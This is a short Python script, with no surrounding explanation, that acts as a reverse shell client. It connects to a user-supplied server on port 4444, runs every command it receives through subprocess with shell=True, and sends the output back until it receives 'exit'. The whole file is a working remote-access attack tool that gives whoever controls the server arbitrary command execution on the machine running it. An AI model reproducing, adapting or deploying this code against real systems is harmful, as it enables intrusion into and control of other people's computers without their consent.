import socket
import subprocess

def connect_to_server(host, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((host, port))
        print(f"Connected to {host}:{port}")
        
        while True:
            command = client_socket.recv(1024).decode()
            if command.lower() == "exit":
                break
            
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                if not output:
                    output = "Command executed, no output."
            except Exception as e:
                output = f"Error: {str(e)}"
            
            client_socket.send(output.encode())
        
        client_socket.close()
    except Exception as e:
        print(f"Error: {e}")
        client_socket.close()

if __name__ == "__main__":
    server_host = input("Enter server IP: ")
    server_port = 4444
    connect_to_server(server_host, server_port)